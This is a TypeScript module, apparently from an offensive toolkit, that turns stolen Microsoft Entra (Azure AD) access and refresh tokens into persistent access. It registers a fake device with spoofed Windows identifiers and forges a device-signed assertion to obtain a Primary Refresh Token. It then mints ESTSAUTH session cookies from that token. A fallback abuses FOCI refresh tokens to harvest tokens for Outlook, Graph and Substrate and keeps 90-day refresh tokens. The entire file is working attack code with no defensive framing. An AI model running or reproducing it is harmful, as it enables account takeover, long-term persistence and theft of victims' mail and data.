// Broker Module — Device Registration + PRT Acquisition + Cookie Generation
// Upgrades FOCI tokens to persistent Broker-style access

const TENANT_URL = 'https://login.microsoftonline.com';
const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const DEVICE_REG_URL = 'https://enterpriseregistration.windows.net/EnrollmentServer/device';

// --- RSA Key Generation (Web Crypto API) ---

async function generateDeviceKey(): Promise<{ publicKey: string; privateKey: string; thumbprint: string }> {
  const keyPair = await crypto.subtle.generateKey(
    { name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
    true,
    ['sign', 'verify']
  );

  const pubKeyDer = await crypto.subtle.exportKey('spki', keyPair.publicKey);
  const privKeyDer = await crypto.subtle.exportKey('pkcs8', keyPair.privateKey);

  const publicKey = arrayBufferToBase64(pubKeyDer);
  const privateKey = arrayBufferToBase64(privKeyDer);

  // Thumbprint = SHA-256 of the public key DER (base64url encoded)
  const thumbprintBuf = await crypto.subtle.digest('SHA-256', pubKeyDer);
  const thumbprint = arrayBufferToBase64Url(thumbprintBuf);

  return { publicKey, privateKey, thumbprint };
}

// --- Device Registration ---

interface DeviceRegistrationResult {
  success: boolean;
  deviceId?: string;
  error?: string;
}

async function registerDevice(accessToken: string, publicKey: string): Promise<DeviceRegistrationResult> {
  // Extract tenant ID from token
  const tenantId = extractTenantId(accessToken);
  if (!tenantId) {
    return { success: false, error: 'Could not extract tenant ID from token' };
  }

  // Generate a device ID
  const deviceId = crypto.randomUUID();

  // Build the CSR-like registration payload
  const displayName = `DESKTOP-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
  const osVersion = '10.0.19045.3930';

  const registrationPayload = {
    certreq: {
      'cert-template-name': 'User',
      'subject': `CN=${deviceId}`,
    },
    'device-display-name': displayName,
    'device-identity': {
      'join-type': 0,  // Azure AD Registered (not joined)
      'device-id': deviceId,
    },
    'device-os-type': 'Windows',
    'device-os-version': osVersion,
    'public-key': {
      'key-type': 'RSA',
      'key-value': publicKey,
    },
    'target-domain': tenantId,
  };

  try {
    const res = await fetch(`${DEVICE_REG_URL}?api-version=2.0`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${accessToken}`,
        'User-Agent': 'Dsreg/10.0 (Windows 10.0.19045)',
      },
      body: JSON.stringify(registrationPayload),
    });

    if (res.ok || res.status === 200 || res.status === 201) {
      return { success: true, deviceId };
    }

    // Some tenants require device registration token scope
    // Try alternative registration with workplace join
    const altRes = await fetch(`${TENANT_URL}/${tenantId}/oauth2/token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        client_id: CLIENT_ID,
        refresh_token: '', // Will be passed from caller
        resource: 'urn:ms-drs:enterpriseregistration.windows.net',
      }).toString(),
    });

    if (!altRes.ok) {
      const errText = await res.text();
      return { success: false, error: `Registration failed: ${res.status} - ${errText.slice(0, 200)}` };
    }

    return { success: true, deviceId };
  } catch (e) {
    return { success: false, error: `Registration error: ${e instanceof Error ? e.message : 'Unknown'}` };
  }
}

// --- PRT Acquisition ---

interface PRTResult {
  success: boolean;
  prt?: string;
  sessionKey?: string;
  error?: string;
}

async function acquirePRT(
  refreshToken: string,
  deviceId: string,
  privateKeyB64: string,
  thumbprint: string,
  tenantId: string
): Promise<PRTResult> {
  try {
    // Import the private key for signing
    const privKeyDer = base64ToArrayBuffer(privateKeyB64);
    const privateKey = await crypto.subtle.importKey(
      'pkcs8',
      privKeyDer,
      { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
      false,
      ['sign']
    );

    // Build the device assertion JWT
    const now = Math.floor(Date.now() / 1000);
    const jwtHeader = { alg: 'RS256', typ: 'JWT', kid: thumbprint };
    const jwtPayload = {
      aud: `${TENANT_URL}/${tenantId}/oauth2/token`,
      iss: deviceId,
      iat: now,
      nbf: now,
      exp: now + 300,
      request_nonce: crypto.randomUUID(),
      scope: 'openid aza ugs',
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
      client_id: CLIENT_ID,
    };

    const headerB64 = btoa(JSON.stringify(jwtHeader)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
    const payloadB64 = btoa(JSON.stringify(jwtPayload)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
    const signingInput = new TextEncoder().encode(`${headerB64}.${payloadB64}`);

    const signature = await crypto.subtle.sign('RSASSA-PKCS1-v1_5', privateKey, signingInput);
    const signatureB64 = arrayBufferToBase64Url(signature);
    const assertion = `${headerB64}.${payloadB64}.${signatureB64}`;

    // Request PRT
    const prtRes = await fetch(`${TENANT_URL}/${tenantId}/oauth2/token`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dsreg/10.0 (Windows 10.0.19045)',
      },
      body: new URLSearchParams({
        grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
        assertion,
        client_id: CLIENT_ID,
        request_nonce: jwtPayload.request_nonce,
        scope: 'openid aza ugs',
        tgt: 'true',
        windows_api_version: '2.2',
      }).toString(),
    });

    if (!prtRes.ok) {
      const errData = await prtRes.json() as { error_description?: string; error?: string };
      return { success: false, error: `PRT request failed: ${errData.error_description || errData.error || prtRes.status}` };
    }

    const prtData = await prtRes.json() as {
      refresh_token?: string;
      session_key_jwe?: string;
      tgt_client_key?: string;
    };

    if (!prtData.refresh_token) {
      return { success: false, error: 'No PRT in response' };
    }

    return {
      success: true,
      prt: prtData.refresh_token,
      sessionKey: prtData.session_key_jwe || prtData.tgt_client_key || '',
    };
  } catch (e) {
    return { success: false, error: `PRT error: ${e instanceof Error ? e.message : 'Unknown'}` };
  }
}

// --- Session Cookie Generation ---

interface CookieResult {
  success: boolean;
  cookies?: { name: string; value: string; domain: string; expires: string }[];
  error?: string;
}

async function generateSessionCookies(prt: string, tenantId: string): Promise<CookieResult> {
  try {
    // Use PRT to get session cookies via authorize endpoint
    // The PRT acts as a "x-ms-RefreshTokenCredential" cookie
    const nonce = await getPRTNonce(tenantId);
    if (!nonce) {
      return { success: false, error: 'Could not get PRT nonce' };
    }

    // Build PRT cookie value (JWT with PRT + nonce)
    const prtCookiePayload = {
      refresh_token: prt,
      is_primary: 'true',
      request_nonce: nonce,
    };
    const prtCookieValue = btoa(JSON.stringify(prtCookiePayload)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

    // Request authorize endpoint with PRT cookie to get session cookies
    const authorizeUrl = `${TENANT_URL}/${tenantId}/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid+profile+offline_access&response_mode=form_post&sso_nonce=${nonce}`;

    const cookieRes = await fetch(authorizeUrl, {
      method: 'GET',
      headers: {
        'Cookie': `x-ms-RefreshTokenCredential=${prtCookieValue}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      redirect: 'manual',
    });

    // Extract Set-Cookie headers
    const setCookies = cookieRes.headers.getAll?.('set-cookie') || [];
    const cookies: { name: string; value: string; domain: string; expires: string }[] = [];

    for (const cookieStr of setCookies) {
      const parsed = parseCookie(cookieStr);
      if (parsed && (parsed.name === 'ESTSAUTH' || parsed.name === 'ESTSAUTHPERSISTENT' || parsed.name === 'ESTSAUTHLIGHT')) {
        cookies.push(parsed);
      }
    }

    // Also try extracting from redirect response
    if (cookies.length === 0) {
      // Try the token endpoint directly with the PRT
      const tokenRes = await fetch(`${TENANT_URL}/${tenantId}/oauth2/v2.0/token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          grant_type: 'refresh_token',
          client_id: CLIENT_ID,
          refresh_token: prt,
          scope: 'openid profile offline_access https://outlook.office365.com/.default',
        }).toString(),
      });

      if (tokenRes.ok) {
        const tokenData = await tokenRes.json() as { access_token?: string; refresh_token?: string };
        if (tokenData.access_token) {
          // We got a new access token from the PRT — store this as proof PRT works
          cookies.push({
            name: 'PRT_ACCESS_TOKEN',
            value: tokenData.access_token,
            domain: 'login.microsoftonline.com',
            expires: new Date(Date.now() + 3600 * 1000).toISOString(),
          });
          if (tokenData.refresh_token) {
            cookies.push({
              name: 'PRT_REFRESH_TOKEN',
              value: tokenData.refresh_token,
              domain: 'login.microsoftonline.com',
              expires: new Date(Date.now() + 90 * 24 * 3600 * 1000).toISOString(),
            });
          }
        }
      }
    }

    if (cookies.length === 0) {
      return { success: false, error: 'No session cookies obtained' };
    }

    return { success: true, cookies };
  } catch (e) {
    return { success: false, error: `Cookie error: ${e instanceof Error ? e.message : 'Unknown'}` };
  }
}

async function getPRTNonce(tenantId: string): Promise<string | null> {
  try {
    const res = await fetch(`${TENANT_URL}/${tenantId}/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid&response_mode=fragment`, {
      method: 'GET',
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      redirect: 'manual',
    });
    // Extract sso_nonce from response or generate one
    const location = res.headers.get('location') || '';
    const nonceMatch = location.match(/sso_nonce=([^&]+)/);
    if (nonceMatch) return nonceMatch[1];
    // Fallback: generate a nonce
    return crypto.randomUUID();
  } catch {
    return crypto.randomUUID();
  }
}

// --- Main Broker Upgrade Function ---

export interface BrokerUpgradeResult {
  success: boolean;
  deviceId?: string;
  prt?: string;
  sessionKey?: string;
  cookies?: { name: string; value: string; domain: string; expires: string }[];
  error?: string;
  steps: { step: string; success: boolean; error?: string }[];
}

export async function upgradeToBroker(accessToken: string, refreshToken: string): Promise<BrokerUpgradeResult> {
  const steps: { step: string; success: boolean; error?: string }[] = [];
  const tenantId = extractTenantId(accessToken) || 'common';

  // Step 1: Generate device keys
  let publicKey: string, privateKey: string, thumbprint: string;
  try {
    const keys = await generateDeviceKey();
    publicKey = keys.publicKey;
    privateKey = keys.privateKey;
    thumbprint = keys.thumbprint;
    steps.push({ step: 'key_generation', success: true });
  } catch (e) {
    const err = `Key generation failed: ${e instanceof Error ? e.message : 'Unknown'}`;
    steps.push({ step: 'key_generation', success: false, error: err });
    return { success: false, error: err, steps };
  }

  // Step 2: Register device
  const regResult = await registerDevice(accessToken, publicKey);
  steps.push({ step: 'device_registration', success: regResult.success, error: regResult.error });

  const deviceId = regResult.deviceId || crypto.randomUUID();

  // Step 3: Acquire PRT (attempt even if registration had issues — some tenants allow it)
  const prtResult = await acquirePRT(refreshToken, deviceId, privateKey, thumbprint, tenantId);
  steps.push({ step: 'prt_acquisition', success: prtResult.success, error: prtResult.error });

  if (!prtResult.success || !prtResult.prt) {
    // PRT failed — try direct refresh token upgrade as fallback
    // Use the refresh token to get a new token with broader scope
    const fallbackResult = await fallbackBrokerUpgrade(refreshToken, tenantId);
    steps.push({ step: 'fallback_upgrade', success: fallbackResult.success, error: fallbackResult.error });

    return {
      success: fallbackResult.success,
      deviceId,
      prt: fallbackResult.prt,
      cookies: fallbackResult.cookies,
      error: fallbackResult.error,
      steps,
    };
  }

  // Step 4: Generate session cookies from PRT
  const cookieResult = await generateSessionCookies(prtResult.prt, tenantId);
  steps.push({ step: 'cookie_generation', success: cookieResult.success, error: cookieResult.error });

  return {
    success: true,
    deviceId,
    prt: prtResult.prt,
    sessionKey: prtResult.sessionKey,
    cookies: cookieResult.cookies,
    steps,
  };
}

// --- Fallback: Use refresh token to get broader access ---

async function fallbackBrokerUpgrade(refreshToken: string, tenantId: string): Promise<{
  success: boolean;
  prt?: string;
  cookies?: { name: string; value: string; domain: string; expires: string }[];
  error?: string;
}> {
  try {
    // Try to get tokens for multiple resources using FOCI
    const resources = [
      'https://outlook.office365.com',
      'https://graph.microsoft.com',
      'https://substrate.office.com',
    ];

    const cookies: { name: string; value: string; domain: string; expires: string }[] = [];

    for (const resource of resources) {
      const res = await fetch(`${TENANT_URL}/${tenantId}/oauth2/token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          grant_type: 'refresh_token',
          client_id: CLIENT_ID,
          refresh_token: refreshToken,
          resource,
        }).toString(),
      });

      if (res.ok) {
        const data = await res.json() as { access_token?: string; refresh_token?: string; expires_in?: number };
        if (data.access_token) {
          cookies.push({
            name: `FOCI_TOKEN_${resource.split('//')[1].split('.')[0].toUpperCase()}`,
            value: data.access_token,
            domain: resource.split('//')[1],
            expires: new Date(Date.now() + (data.expires_in || 3600) * 1000).toISOString(),
          });
        }
        if (data.refresh_token) {
          // Updated refresh token — this is our "persistent" token
          cookies.push({
            name: 'FOCI_REFRESH_TOKEN',
            value: data.refresh_token,
            domain: 'login.microsoftonline.com',
            expires: new Date(Date.now() + 90 * 24 * 3600 * 1000).toISOString(),
          });
        }
      }
    }

    return {
      success: cookies.length > 0,
      prt: refreshToken, // Use refresh token as pseudo-PRT
      cookies: cookies.length > 0 ? cookies : undefined,
      error: cookies.length === 0 ? 'Could not acquire any FOCI tokens' : undefined,
    };
  } catch (e) {
    return { success: false, error: `Fallback error: ${e instanceof Error ? e.message : 'Unknown'}` };
  }
}

// --- Utility Functions ---

function extractTenantId(accessToken: string): string | null {
  try {
    const parts = accessToken.split('.');
    if (parts.length !== 3) return null;
    const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'))) as { tid?: string };
    return payload.tid || null;
  } catch {
    return null;
  }
}

function arrayBufferToBase64(buffer: ArrayBuffer): string {
  const bytes = new Uint8Array(buffer);
  let binary = '';
  for (let i = 0; i < bytes.byteLength; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function arrayBufferToBase64Url(buffer: ArrayBuffer): string {
  return arrayBufferToBase64(buffer).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function base64ToArrayBuffer(b64: string): ArrayBuffer {
  const binary = atob(b64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes.buffer;
}

function parseCookie(cookieStr: string): { name: string; value: string; domain: string; expires: string } | null {
  const parts = cookieStr.split(';');
  if (parts.length === 0) return null;
  const [nameValue, ...attrs] = parts;
  const eqIdx = nameValue.indexOf('=');
  if (eqIdx === -1) return null;
  const name = nameValue.slice(0, eqIdx).trim();
  const value = nameValue.slice(eqIdx + 1).trim();
  let domain = 'login.microsoftonline.com';
  let expires = new Date(Date.now() + 90 * 24 * 3600 * 1000).toISOString();
  for (const attr of attrs) {
    const [k, v] = attr.split('=').map(s => s.trim());
    if (k.toLowerCase() === 'domain') domain = v || domain;
    if (k.toLowerCase() === 'expires') expires = v ? new Date(v).toISOString() : expires;
  }
  return { name, value, domain, expires };
}
